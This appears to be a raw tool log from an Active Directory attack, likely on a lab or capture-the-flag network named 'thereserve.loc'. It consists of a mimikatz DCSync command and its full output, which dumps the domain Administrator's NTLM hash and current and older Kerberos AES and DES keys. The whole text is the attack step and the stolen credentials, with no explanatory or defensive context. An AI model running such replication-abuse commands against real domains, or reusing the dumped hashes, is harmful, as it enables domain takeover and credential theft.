sadump::dcsync /dc:rootdc.thereserve.loc /domain:thereserve.loc /user:S-1-5-21-1255581842-1300659601-3764024703-500
[DC] 'thereserve.loc' will be the domain
[DC] 'rootdc.thereserve.loc' will be the DC server
[DC] 'S-1-5-21-1255581842-1300659601-3764024703-500' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 1601/01/01 01:00:00
Password last change : 2022/09/07 19:39:09
Object Security ID   : S-1-5-21-1255581842-1300659601-3764024703-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 5e3d8d541c6d3891c20a503464869fa9

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : c28ad7eba0e4275d011ac964bcb758af

* Primary:Kerberos-Newer-Keys *
    Default Salt : EC2AMAZ-A6S61FRAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 48ebe1e15968bff9df330193fd423f4788c9e199978ceb08dc783808cc23464f
      aes128_hmac       (4096) : 681f58305f910a753fd1c6412f186d23
      des_cbc_md5       (4096) : a858fb86ea375df1
    OldCredentials
      aes256_hmac       (4096) : 48ebe1e15968bff9df330193fd423f4788c9e199978ceb08dc783808cc23464f
      aes128_hmac       (4096) : 681f58305f910a753fd1c6412f186d23
      des_cbc_md5       (4096) : a858fb86ea375df1
    OlderCredentials
      aes256_hmac       (4096) : b33b54b99b15d32e68115dad2654d68cc078e12d914ed25f83c979999e3023f3
      aes128_hmac       (4096) : 3f4218a3004f1d579670e545254fabb3
      des_cbc_md5       (4096) : 3ed04f79e6a2e576

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : EC2AMAZ-A6S61FRAdministrator
    Credentials
      des_cbc_md5       : a858fb86ea375df1
    OldCredentials
      des_cbc_md5       : a858fb86ea375df1